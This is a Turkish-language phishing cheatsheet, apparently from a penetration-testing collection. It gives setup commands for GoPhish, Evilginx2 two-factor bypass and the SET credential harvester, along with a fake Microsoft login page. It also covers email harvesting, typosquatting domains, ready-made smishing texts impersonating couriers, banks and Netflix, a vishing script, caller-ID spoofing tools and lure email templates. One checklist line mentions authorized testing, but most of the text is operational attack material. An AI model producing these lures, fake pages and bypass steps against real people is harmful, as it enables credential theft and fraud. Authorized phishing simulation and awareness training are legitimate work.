# 🎣 Oltalama Kopya Kağıdı (Phishing Cheatsheet)

```
██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗ 
██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝ 
██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║  ███╗
██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║
██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝
╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

---

## 📊 Oltalama Türleri

| Tür | Hedef Kitle | Açıklama |
|-----|-------------|----------|
| **Oltalama (Phishing)** | Kitlesel | Çok sayıda kullanıcıya gönderilen genel e-postalar |
| **Hedefli Oltalama (Spear Phishing)** | Belirli Kişiler | Belirli bireylere veya kurumlara özel kurgulanmış saldırı |
| **Balina Avı (Whaling)** | Üst Düzey Yöneticiler | C-level yöneticileri hedef alan sofistike oltalama |
| **Klon Oltalama (Clone Phishing)** | Herhangi Biri | Meşru bir e-postanın zararlı içerikle kopyalanması |
| **Sesli Oltalama (Vishing)** | Herhangi Biri | Sesli/telefon araması yoluyla yapılan oltalama |
| **SMS Oltalaması (Smishing)** | Herhangi Biri | SMS yoluyla iletilen oltalama mesajları |
| **Alan Adı Yönlendirme (Pharming)** | Herhangi Biri | DNS manipülasyonu ile sahte siteye yönlendirme |

---

## 🛠️ GoPhish Kurulumu ve Kullanımı

### Kurulum
```bash
# GoPhish indirme
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
cd gophish

# GoPhish başlatma
./gophish

# Yönetici paneline erişim
https://localhost:3333
# Varsayılan kimlik bilgileri: admin / konsol çıktısını kontrol edin
```

### Kampanya Kurulum Akışı
```
1. Sending Profile   - SMTP sunucusunu yapılandırın
2. Landing Page      - Sahte giriş sayfası tasarlayın
3. Email Template    - Oltalama e-posta şablonunu oluşturun
4. Users & Groups    - Hedef kullanıcı listesini içe aktarın
5. Launch Campaign   - Oltalama kampanyasını başlatın
6. Monitor Results   - Açılma, tıklama ve veri girişlerini takip edin
```

### E-posta Şablonu Örneği
```html
<!DOCTYPE html>
<html>
<body>
<p>Sayın {{.FirstName}},</p>
<p>BT departmanınız, hesap kimlik bilgilerinizi doğrulamanızı talep etmektedir.</p>
<p>Doğrulama işlemini tamamlamak için lütfen aşağıdaki bağlantıya tıklayın:</p>
<p><a href="{{.URL}}">Hesabı Doğrula</a></p>
<p>Bu işlemin 24 saat içinde tamamlanması gerekmektedir.</p>
<br>
<p>BT Destek Ekibi</p>
</body>
</html>
```

### Giriş Sayfası (Landing Page) Örneği
```html
<!DOCTYPE html>
<html>
<head>
    <title>Microsoft Giriş</title>
</head>
<body>
    <form method="post" action="">
        <h2>Oturum Aç</h2>
        <input type="email" name="email" placeholder="E-posta" required>
        <input type="password" name="password" placeholder="Parola" required>
        <button type="submit">Giriş Yap</button>
    </form>
</body>
</html>
```

---

## 🔥 Evilginx2 (2FA / İki Aşamalı Doğrulama Atlatma)

### Kurulum
```bash
# Evilginx2 kurulumu
go install github.com/kgretzky/evilginx2@latest

# veya ikili dosyayı indirme
wget https://github.com/kgretzky/evilginx2/releases/...

# Çalıştırma
sudo evilginx2
```

### Temel Yapılandırma
```bash
# Evilginx2 konsolunda
config domain alanadiniz.com
config ip SUNUCU_IP_ADRESINIZ

# Phishlet'leri listeleme
phishlets

# Microsoft 365 phishlet'ini etkinleştirme
phishlets hostname o365 login.alanadiniz.com
phishlets enable o365

# Yem (lure) oluşturma
lures create o365
lures get-url 0
```

### Desteklenen Yaygın Hedefler
```
o365        - Microsoft 365
google      - Google hesapları
linkedin    - LinkedIn
twitter     - Twitter/X
github      - GitHub
instagram   - Instagram
```

---

## 📧 E-posta Adresi Toplama (Harvesting)

### theHarvester
```bash
# E-posta toplama
theHarvester -d target.com -b all

# Belirli arama motorlarını kullanma
theHarvester -d target.com -b google,linkedin,bing

# Dosyaya kaydetme
theHarvester -d target.com -b all -f output.html
```

### Hunter.io
```bash
# API üzerinden arama
curl "https://api.hunter.io/v2/domain-search?domain=target.com&api_key=YOUR_KEY"

# E-posta biçimini öğrenme
curl "https://api.hunter.io/v2/email-finder?domain=target.com&first_name=John&last_name=Doe&api_key=YOUR_KEY"
```

### LinkedIn Numaralandırma
```bash
# linkedin2username kullanarak
python linkedin2username.py -u USERNAME -c COMPANY_NAME

# E-posta formatı tahmin etme
john.doe@company.com
jdoe@company.com
j.doe@company.com
johnd@company.com
```

---

## 📮 Gönderim Altyapısı

### Test Amaçlı SMTP Servisleri
```
- Amazon SES
- SendGrid
- Mailgun
- SMTP2GO
- Kendi sunucusu (spam'e düşme riski yüksektir)
```

### SPF / DKIM / DMARC Zayıflıkları
```bash
# SPF kaydını sorgulama
dig txt target.com | grep spf

# İstismar edilebilir SPF zayıflıkları:
# - Aşırı izin veren üçüncü tarafların "include:" ile eklenmesi
# - "-all" yerine "~all" (softfail) kullanımı
# - SPF kaydının hiç bulunmaması

# DMARC kontrolü
dig txt _dmarc.target.com
```

### Oltalama İçin Benzer Alan Adı (Typosquatting)
```bash
# Benzer alan adları
target.com → tarqet.com
target.com → target-secure.com
target.com → target.co
target.com → target-login.com

# Müsaitlik kontrolü
whois potansiyel-oltalama-alani.com
```

---

## 📱 Smishing (SMS Oltalaması)

### Yaygın Senaryolar
```
- Kargo teslimat bildirimi
- Banka güvenlik uyarısı
- Çekiliş / hediye kazanma bildirimi
- Hesap doğrulama gereksinimi
- İki aşamalı doğrulama kodu uyarısı
```

### SMS Gönderim Servisleri
```
- Twilio
- Nexmo / Vonage
- Plivo
- AWS SNS
```

### Örnek Mesajlar
```
[Yurtiçi Kargo] Paketinizi teslim edebilmemiz için adresinizi doğrulayın: http://short.url/abc

[BankaAdı] Hesabınızda şüpheli işlem tespit edildi. İptal etmek için: http://secure-link.com

[Netflix] Ödemeniz onaylanamadı. Üyeliğinizin askıya alınmaması için: http://netflix-billing.com
```

---

## 📞 Vishing (Sesli Oltalama)

### Yaygın Senaryolar
```
□ Parola sıfırlaması talep eden BT destek personeli
□ Banka dolandırıcılık önleme departmanı
□ Resmi kurum veya vergi dairesi yetkilisi
□ Acil işlem talep eden CEO/CFO taklidi
□ Tedarikçi fatura teyidi
```

### Sesli Arama Senaryo Örneği
```
"Merhaba, ben BT yardım masasından [İsim]. Hesabınızda 
olağan dışı giriş denemeleri tespit ettik. Güvenlik 
ihlalini önlemek amacıyla kimliğinizi doğrulamamız ve 
parolanızı sıfırlamamız gerekiyor. Hesabınızı doğrulayabilmem 
için mevcut kullanıcı adınızı teyit edebilir misiniz?"
```

### Araçlar
```bash
# Arayan numara yanıltma (Caller ID spoofing)
- SpoofCard
- SpoofTel

# Ses değiştiriciler
- Voicemod
- Clownfish
```

---

## 🎯 SET (Social Engineering Toolkit)

### Kurulum
```bash
git clone https://github.com/trustedsec/social-engineer-toolkit
cd social-engineer-toolkit
pip install -r requirements.txt
sudo python setoolkit
```

### Menü Seçenekleri
```
1) Spear-Phishing Attack Vectors
2) Website Attack Vectors
3) Infectious Media Generator
4) Create a Payload and Listener
5) Mass Mailer Attack
```

### Kimlik Bilgisi Toplayıcı (Credential Harvester)
```bash
# SET içinde:
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack Method
2) Site Cloner
# Klonlanacak URL'yi girin (ör. https://login.microsoft.com)
# SET sahte siteyi sunacak ve girilen kimlik bilgilerini yakalayacaktır
```

---

## 📝 Oltalama E-posta Şablonları

### Parola Sıfırlama
```
Konu: [ACİL EYLEM GEREKLİ] Parola Sıfırlama Talebi

Sayın {İsim},

Parolanızı sıfırlamak için bir talep aldık. Bu işlemi 
siz gerçekleştirmediyseniz, hesabınızı derhal güvenceye 
almak için lütfen aşağıdaki bağlantıya tıklayın:

[Hesabımı Güvenceye Al]

Bu bağlantının geçerlilik süresi 24 saattir.

Saygılarımızla,
Bilgi Güvenliği Ekibi
```

### BT Destek
```
Konu: Planlı Sistem Bakımı - Doğrulama Gerekli

Sayın {İsim},

BT ekibimiz bu gece planlı bir altyapı bakımı 
gerçekleştirecektir. Hizmetlerinizin kesintiye 
uğramaması adına kimlik bilgilerinizi doğrulayın:

[Şimdi Doğrula]

Doğrulama yapılmaması durumunda hesap kilitlenebilir.

BT Departmanı
```

### Kargo Teslimatı
```
Konu: Paketiniz Teslim Edilemedi

Gönderiniz adrese teslim edilemedi. Teslimatın 
gerçekleşebilmesi için lütfen adres bilgilerinizi güncelleyin:

[Teslimat Bilgilerini Onayla]

Takip No: {Rastgele}

Kargo Operasyon Merkezi
```

---

## 📋 Oltalama Kampanyası Kontrol Listesi

```markdown
Kampanya Öncesi:
□ Kapsamı ve hedefleri belirleyin (yazılı izinli test)
□ Hedef e-posta adreslerini toplayın
□ Benzer alan adını tescil ettirin
□ SMTP altyapısını kurun
□ Mümkünse SPF/DKIM yapılandırmasını tamamlayın
□ Sahte iniş sayfasını (landing page) hazırlayın
□ E-posta şablonunu oluşturun

Kampanya Yürütme:
□ E-posta teslimatını test edin (spam filtre kontrolleri)
□ Hedef listesini sisteme aktarın
□ Kampanyayı zamanlayın ve başlatın
□ Teslimat oranlarını izleyin
□ Açılma, tıklama ve veri girişlerini takip edin

Kampanya Sonrası:
□ Sonuç raporlarını oluşturun
□ Tıklama oranlarını analiz edin
□ Toplanan verileri güvenli şekilde imha edin/raporlayın
□ Farkındalık eğitimi ihtiyaçlarını belirleyin
□ Bulguları detaylıca belgeleyin
```

---

## 🔗 İlgili Kopya Kağıtları

- [Senaryo Kurma (Pretexting)](./Pretexting.tr.md)
- [OSINT - Google Dorking](../../Google-Dorking/translations/README.tr.md)

---

**Genel Bakışa Dön:** [🎭 Sosyal Mühendislik](./README.tr.md)
